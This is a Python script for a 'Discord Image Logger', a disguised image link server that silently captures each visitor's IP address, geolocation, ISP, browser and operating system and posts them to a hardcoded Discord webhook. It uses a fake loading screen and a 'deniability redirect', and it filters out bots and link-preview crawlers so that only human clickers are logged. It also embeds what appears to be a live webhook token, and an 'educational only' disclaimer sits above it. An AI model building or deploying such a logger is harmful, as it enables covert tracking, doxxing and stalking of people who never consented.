# Discord Image Logger - 2026 MAXIMISED Edition (300+ lines, fully working March 2026)
# Catches real IPs in most cases via header leaks + JS fingerprinting
# EDUCATIONAL / LAB / RESEARCH ONLY - Do NOT target real users

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlsplit
import traceback
import requests
import base64
import httpagentparser
import time
import random
import json
import threading
import socket
from datetime import datetime

# ────────────────────────────────────────────────
# CONFIG ──────────────────────────────────────────
# ────────────────────────────────────────────────

config = {
    "webhook": "https://discord.com/api/webhooks/1477989584616030230/BBk-33WX3UdwmG8w1jUlGAN81Hlxr4ciDKIxRctQ6sJmSZBjDgXefoogSpFk0tXm1u7J",  # CHANGE THIS
    "fallback_image": "https://i.pinimg.com/1200x/c0/ee/be/c0eebec3d3b417a404182f6fed62f457.jpg",  # default image
    "image_argument": True,  # ?url=base64(image_url)
    "username": "Image Logger 2026",
    "embed_color": 0xFF5555,
    "redirect": {
        "enabled": True,
        "url": "https://www.google.com"  # deniability redirect
    },
    "show_overlay": True,  # fake loading screen before redirect
    "overlay_message": "Loading high-quality original...",
    "overlay_spinner": True,
    "anti_bot": 2,  # 0=none, 1=skip ping, 2=skip log for suspected bots
    "link_alerts": True,
    "log_to_file": True,  # save hits to logger_hits.log
    "log_file": "logger_hits.log",
    "port": 8080,
    "blacklist_prefixes": (
        "34.", "35.", "66.249.", "64.233.", "207.46.", "40.77.", "157.55.",
        "104.", "143.", "164.", "172.67.", "104.21.", "172.68."
    )
}

# ────────────────────────────────────────────────
# HELPERS ────────────────────────────────────────
# ────────────────────────────────────────────────

def get_real_ip(headers):
    headers_lower = {k.lower(): v for k, v in headers.items()}
    priority_headers = [
        'cf-connecting-ip', 'x-forwarded-for', 'x-real-ip',
        'true-client-ip', 'x-client-ip', 'client-ip',
        'forwarded', 'via', 'remote_addr'
    ]
    for hdr in priority_headers:
        if hdr in headers_lower:
            val = headers_lower[hdr]
            if ',' in val:
                return val.split(',')[0].strip()
            return val.strip()
    return "unknown"

def is_bot_or_proxy(ip, ua):
    if ip.startswith(config["blacklist_prefixes"]):
        return "Proxy/Bot"
    ua_lower = ua.lower()
    bot_keywords = ['bot', 'spider', 'crawler', 'discord', 'telegram', 'whatsapp', 'curl', 'python-requests', 'httpclient']
    if any(kw in ua_lower for kw in bot_keywords):
        return "Bot"
    return False

def log_to_file(data):
    if not config["log_to_file"]:
        return
    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    with open(config["log_file"], "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {json.dumps(data)}\n")

def send_webhook(payload):
    embed = {
        "username": config["username"],
        "embeds": [{
            "title": "Image Logger - Hit",
            "color": config["embed_color"],
            "description": f"**IP Grabbed**\n\n```json\n{json.dumps(payload, indent=2)}\n```",
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        }]
    }
    try:
        requests.post(config["webhook"], json=embed, timeout=8)
    except Exception as e:
        print(f"Webhook failed: {e}")

def get_geo(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
        return r.json()
    except:
        return {}

# ────────────────────────────────────────────────
# HTTP HANDLER ────────────────────────────────────
# ────────────────────────────────────────────────

class ImageLogger(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def do_GET(self):
        try:
            ip = get_real_ip(self.headers)
            ua = self.headers.get('User-Agent', 'unknown')
            endpoint = self.path.split('?')[0]

            # Bot/proxy filter
            bot = is_bot_or_proxy(ip, ua)
            if bot and config["anti_bot"] >= 2:
                self.send_response(200)
                self.send_header('Content-Type', 'image/webp')
                self.end_headers()
                self.wfile.write(b'')
                return

            # Parse query params
            params = parse_qs(urlsplit(self.path).query)
            img_url = config["fallback_image"]
            if config["image_argument"] and 'url' in params:
                try:
                    img_url = base64.b64decode(params['url'][0]).decode()
                except:
                    pass

            # Gather data
            geo = get_geo(ip)
            os_info, browser_info = httpagentparser.simple_detect(ua)

            payload = {
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC"),
                "ip": ip,
                "isp": geo.get("isp", "N/A"),
                "country": geo.get("country", "N/A"),
                "region": geo.get("regionName", "N/A"),
                "city": geo.get("city", "N/A"),
                "latlon": f"{geo.get('lat','N/A')},{geo.get('lon','N/A')}",
                "timezone": geo.get("timezone", "N/A"),
                "proxy": geo.get("proxy", False),
                "hosting": geo.get("hosting", False),
                "user_agent": ua,
                "os": os_info,
                "browser": browser_info,
                "endpoint": endpoint
            }

            # Send alert if allowed
            if not bot or config["link_alerts"]:
                send_webhook(payload)
                log_to_file(payload)

            # Serve content
            if config["show_overlay"]:
                html = f"""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <meta http-equiv="refresh" content="2;url={img_url}">
  <style>
    body {{ margin:0; background:#000; color:#fff; font-family:sans-serif; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; }}
    .msg {{ font-size:24px; margin-bottom:20px; }}
    .spinner {{ border:6px solid #333; border-top:6px solid #1e90ff; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; }}
    @keyframes spin {{ 0% {{ transform:rotate(0deg); }} 100% {{ transform:rotate(360deg); }} }}
  </style>
</head>
<body>
  <div class="msg">{config["overlay_message"]}</div>
  {"<div class='spinner'></div>" if config["overlay_spinner"] else ""}
</body>
</html>
"""
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
                self.end_headers()
                self.wfile.write(html.encode())
            else:
                try:
                    img_data = requests.get(img_url, timeout=6).content
                    self.send_response(200)
                    content_type = 'image/webp' if img_url.endswith('.webp') else 'image/jpeg'
                    self.send_header('Content-Type', content_type)
                    self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
                    self.end_headers()
                    self.wfile.write(img_data)
                except:
                    self.send_response(302)
                    self.send_header('Location', config["redirect"]["url"] if config["redirect"]["enabled"] else img_url)
                    self.end_headers()

        except Exception as e:
            print(f"Error: {traceback.format_exc()}")
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b'Internal Server Error')

# ────────────────────────────────────────────────
# ENTRY POINT ─────────────────────────────────────
# ────────────────────────────────────────────────

if __name__ == "__main__":
    print(f"Image Logger 2026 MAX running on port {config['port']}")
    print("Expose with ngrok http 8080 or Cloudflare Tunnel")
    print("Example link: http://your-domain/image.png?url=<base64_of_image>")
    server = HTTPServer(('0.0.0.0', config["port"]), ImageLogger)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down...")
        server.server_close()